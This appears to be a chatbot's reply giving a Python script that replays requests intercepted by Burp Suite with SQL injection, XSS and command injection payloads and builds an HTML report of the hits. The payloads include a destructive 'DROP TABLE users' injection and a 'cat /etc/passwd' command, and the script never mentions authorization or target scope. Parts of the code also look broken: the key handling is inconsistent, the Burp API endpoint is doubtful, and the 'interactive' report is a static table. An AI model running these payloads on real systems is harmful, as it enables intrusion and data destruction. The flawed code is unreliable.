Here's an **advanced version** of the script that not only **automates vulnerability detection** but also **generates an interactive HTML report** üöÄ  

---

## **üî• New Features**
‚úÖ **Extracts and modifies intercepted HTTP requests via Burp Suite**  
‚úÖ **Tests for SQL Injection, XSS, and Command Injection**  
‚úÖ **Generates an HTML report with interactive tables**  

---

## **üõ†Ô∏è Setup Requirements**
1. **Enable Burp Suite API:**  
   - Go to **Burp Suite ‚Üí User Options ‚Üí Misc**  
   - Enable API listening on **http://127.0.0.1:1337**  
2. **Install dependencies:**  
   ```bash
   pip install requests jinja2
   ```

---

## **üöÄ Python Script: Automated Attack & HTML Report**
```python
import requests
import json
import os
from jinja2 import Template

# Burp Suite API & Proxy Configuration
BURP_PROXY = "http://127.0.0.1:8080"
BURP_API_URL = "http://127.0.0.1:1337/v0.1"

# Attack Payloads
ATTACK_PAYLOADS = {
    "SQLi": ["' OR 1=1 --", "'; DROP TABLE users; --", "' UNION SELECT null, username, password FROM users --"],
    "XSS": ['<script>alert(1)</script>', '" onmouseover="alert(1)"', "'';!--\"<XSS>=&{()}"],
    "CMD": ["; ls -la", "&& whoami", "| cat /etc/passwd"]
}

# Headers to mimic browser behavior
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Log File
LOG_FILE = "burp_attack_log.json"
REPORT_FILE = "burp_attack_report.html"


def log_vulnerability(url, field, payload, attack_type, response):
    """Logs vulnerabilities to a JSON file for report generation."""
    log_entry = {
        "attack_type": attack_type,
        "url": url,
        "field": field,
        "payload": payload,
        "response": response[:200]
    }

    # Append to JSON log
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as file:
            data = json.load(file)
    else:
        data = []

    data.append(log_entry)

    with open(LOG_FILE, "w") as file:
        json.dump(data, file, indent=4)

    print(f"[!] {attack_type} detected on {field} with payload: {payload}")


def get_burp_intercepted_requests():
    """Fetch intercepted requests from Burp Suite."""
    response = requests.get(f"{BURP_API_URL}/http/requests", headers={"Accept": "application/json"})

    if response.status_code != 200:
        print("[ERROR] Could not fetch intercepted requests.")
        return []

    return response.json()


def attack_intercepted_requests():
    """Modify and replay intercepted requests with attack payloads."""
    intercepted_requests = get_burp_intercepted_requests()

    for req in intercepted_requests:
        if "request" not in req:
            continue

        url = req["url"]
        method = req["method"]
        original_data = req["body"] if "body" in req else None

        if not original_data:
            continue

        for attack_type, payloads in ATTACK_PAYLOADS.items():
            for payload in payloads:
                modified_data = original_data
                for param in original_data.split("&"):
                    key, value = param.split("=")
                    modified_data = modified_data.replace(value, payload)

                print(f"[*] Testing {attack_type} on {url} with payload: {payload}")

                if method == "POST":
                    response = requests.post(url, headers=HEADERS, data=modified_data, proxies={"http": BURP_PROXY, "https": BURP_PROXY}, verify=False)
                else:
                    response = requests.get(f"{url}?{modified_data}", headers=HEADERS, proxies={"http": BURP_PROXY, "https": BURP_PROXY}, verify=False)

                if attack_type == "SQLi" and ("error in your SQL syntax" in response.text.lower() or "mysql_fetch" in response.text.lower()):
                    log_vulnerability(url, key, payload, "SQL Injection", response.text)
                elif attack_type == "XSS" and payload in response.text:
                    log_vulnerability(url, key, payload, "XSS", response.text)
                elif attack_type == "CMD" and "root" in response.text.lower():
                    log_vulnerability(url, key, payload, "Command Injection", response.text)


def generate_html_report():
    """Generates an HTML report based on the attack results."""
    if not os.path.exists(LOG_FILE):
        print("[INFO] No vulnerabilities found. Skipping report generation.")
        return

    with open(LOG_FILE, "r") as file:
        data = json.load(file)

    template = Template("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Burp Suite Attack Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid black; padding: 10px; text-align: left; }
            th { background-color: #333; color: white; }
            .sql { background-color: #ffcccc; }
            .xss { background-color: #ffffcc; }
            .cmd { background-color: #ccffcc; }
        </style>
    </head>
    <body>
        <h1>Burp Suite Attack Report</h1>
        <table>
            <tr>
                <th>Attack Type</th>
                <th>URL</th>
                <th>Field</th>
                <th>Payload</th>
                <th>Response Snippet</th>
            </tr>
            {% for entry in data %}
            <tr class="{{ entry.attack_type.lower() }}">
                <td>{{ entry.attack_type }}</td>
                <td>{{ entry.url }}</td>
                <td>{{ entry.field }}</td>
                <td>{{ entry.payload }}</td>
                <td>{{ entry.response[:100] }}...</td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """)

    with open(REPORT_FILE, "w") as report_file:
        report_file.write(template.render(data=data))

    print(f"[‚úî] HTML report generated: {REPORT_FILE}")


def main():
    print("[*] Fetching intercepted requests from Burp Suite...")
    attack_intercepted_requests()
    generate_html_report()


if __name__ == "__main__":
    main()
```

---

## **üîç How It Works**
1. **Extracts intercepted requests** from Burp Suite API.  
2. **Injects SQL Injection, XSS, and Command Injection payloads** into HTTP requests.  
3. **Sends modified requests** through Burp Suite‚Äôs proxy.  
4. **Detects successful attacks** and logs them in `burp_attack_log.json`.  
5. **Generates an interactive HTML report** (`burp_attack_report.html`).  

---

## **üìú Example Report Output**
| Attack Type | URL | Field | Payload | Response Snippet |
|------------|------|-------|---------|------------------|
| SQL Injection | `https://example.com/login` | `username` | `' OR 1=1 --` | `SQL syntax error near...` |
| XSS | `https://example.com/search` | `q` | `<script>alert(1)</script>` | `<script>alert(1)</script>` found in response |
| CMD Injection | `https://example.com/ping` | `input` | `&& whoami` | `root` detected in response |

---

## **üî• Next Steps**
‚úÖ **Add CSRF testing**  
‚úÖ **Integrate with Selenium for UI-based attacks**  
‚úÖ **Export report as PDF**  
